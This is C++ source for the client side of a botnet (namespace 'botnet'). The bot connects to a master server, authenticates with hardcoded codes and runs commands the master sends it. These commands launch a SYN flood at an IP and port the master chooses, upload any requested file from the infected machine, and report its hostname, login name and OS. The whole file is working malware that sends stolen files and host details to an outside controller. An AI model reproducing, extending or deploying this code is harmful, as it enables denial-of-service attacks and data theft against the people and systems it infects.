#include "Bot.h"
#include "TCPFunctions.h"

#include <limits.h>
#include <iostream>
#include <fstream>
#include <string.h>
#include <pwd.h>
#include <sys/stat.h>

using namespace botnet;

// Init the server connection on port 0 to automaticly choose free port
Bot::Bot() : server_connection(0) {
	
}

bool Bot::ConnectToMaster(const std::string& host, const std::string& port) {
	if (!this->server_connection.Connect(host, port)) {
		return false;
	}

	return this->AuthenticateServer();
}

void Bot::ListenToMaster() {
	if (!this->server_connection.isConnected()) {
		throw std::runtime_error("ListenToMaster(): Bot not connected to master");
	}

	std::string master_message;
	int retv = 0;
	while (1) {
		// Wait for command from master
		retv = this->server_connection.Recv(master_message, sizeof(char));

		if (retv == sizeof(char)) {
			if (master_message[0] < 0 || master_message[0] >= ARG_CNT) {
				// On wrong code, flush the recv socket buffer.
				this->FlushIncoming();
			}
			else {
				Commands command = static_cast<Commands>(master_message[0]);
				(this->*GetCommandFunction(command))();
			}
		}
		// If master cut connection, quit
		else if (retv == 0) {
			break;
		}
	}
}


void Bot::FlushIncoming() {
	std::string tmp;
	static const int KILOBYTE = 1024;

	// Read until not able to anymore
	while (this->server_connection.Recv(tmp, KILOBYTE, 0) > 0);
}

bool Bot::AuthenticateServer() {
	static const std::string expected_server_auth = "666";
	static const std::string answer = "999";
	std::string server_auth;

	int try_cnt = 0;

	int retv = this->server_connection.Recv(server_auth, expected_server_auth.length());
	if (retv == static_cast<int>(expected_server_auth.length()) &&
		server_auth == expected_server_auth)
	{
		while (try_cnt < 3) {
			if (this->server_connection.Send(answer) == static_cast<int>(answer.length())) {
				return true;
			}
			try_cnt++;
		}
	}

	return false;
}

/* Botnet command functions */

void Bot::KeepAlive() {
	static const char KEEP_ALIVE_CODE = static_cast<char>(Commands::KEEP_ALIVE);

	// Try to send 3 times
	int try_cnt = 0;
	while (try_cnt < 3) {
		if (this->server_connection.Send(static_cast<const void*>(&KEEP_ALIVE_CODE), sizeof(char)) == sizeof(char)) {
			break;
		}
		try_cnt++;
	}
}

void Bot::SYNFlood() {
	
	char                IP_to_flood[INET_ADDRSTRLEN] = { 0 };
	uint16_t            port_to_flood                =   0  ;
	static const double TIMEOUT                      =  2.5 ;

	if (this->server_connection.Recv(IP_to_flood, INET_ADDRSTRLEN, TIMEOUT) == INET_ADDRSTRLEN &&
		this->server_connection.Recv(&port_to_flood, sizeof(port_to_flood), TIMEOUT) == sizeof(port_to_flood))
	{
		port_to_flood = ntohs(port_to_flood);
		try {
			TCPFunctions::SendRawPacketData(IP_to_flood, port_to_flood, true, false, 10);
		}
		catch (const std::exception& e) {
			// On exception, abort
			return;
		}
	}
}

void Bot::GetFile() {
	static const size_t MAX_FILE_LENGTH = 64;
	static const double TIMEOUT = 2.5;

	static const char file_found     = 'Y';
	static const char file_not_found = 'N';

	std::string file_path;
	int retv = 0;

	if (this->server_connection.Recv(file_path, MAX_FILE_LENGTH, TIMEOUT) > 0) {
		// Check if have requested file
		if (access(file_path.c_str(), F_OK) == 0) {
			retv = this->server_connection.Send(&file_found, sizeof(char));
		}
		else {
			retv = this->server_connection.Send(&file_not_found, sizeof(char));
		}

		if (retv != sizeof(char)) {
			// On fail, abort
			return;
		}

		// Send the requested file
		struct stat st = { 0 };
		if (stat(file_path.c_str(), &st) == -1) {
			return;
		}
		uint32_t file_size = st.st_size;
		file_size = htonl(file_size);

		if (this->server_connection.Send(&file_size, sizeof(file_size)) != sizeof(file_size)) {
			return;
		}

		std::ifstream file_to_send;
		file_to_send.open(file_path);
		if (file_to_send.bad()) {
			return;
		}

		std::string file_content((std::istreambuf_iterator<char>(file_to_send)),
			                     (std::istreambuf_iterator<char>()));

		this->server_connection.Send(file_content);
	}

}


void Bot::StopFlood() {
	;
}

void Bot::GetInfo() {
	std::string info;

	char host_name[HOST_NAME_MAX] = { 0 };

	struct passwd* pass;
	
	if (gethostname(host_name, HOST_NAME_MAX) == 0) {
		info += std::string("Host Name: ") + host_name + "\n";
	}

	if ((pass = getpwuid(getuid())) != nullptr) {
		info += std::string("Login Name: ") + pass->pw_name + "\n";
	}
	
	else {
		std::cout << errno << ": "<< std::string(strerror(errno)) << std::endl;
	}

	info += "OS: " + this->GetOsName() + "\n";


	this->server_connection.Send(info);
}


/* Botnet command function helpers */

std::string Bot::GetOsName() {
    #ifdef _WIN32
    return "Windows 32-bit";
    #elif _WIN64
    return "Windows 64-bit";
    #elif __unix || __unix__
    return "Unix";
    #elif __APPLE__ || __MACH__
    return "Mac OSX";
    #elif __linux__
    return "Linux";
    #elif __FreeBSD__
    return "FreeBSD";
    #else
    return "Unkown";
    #endif
}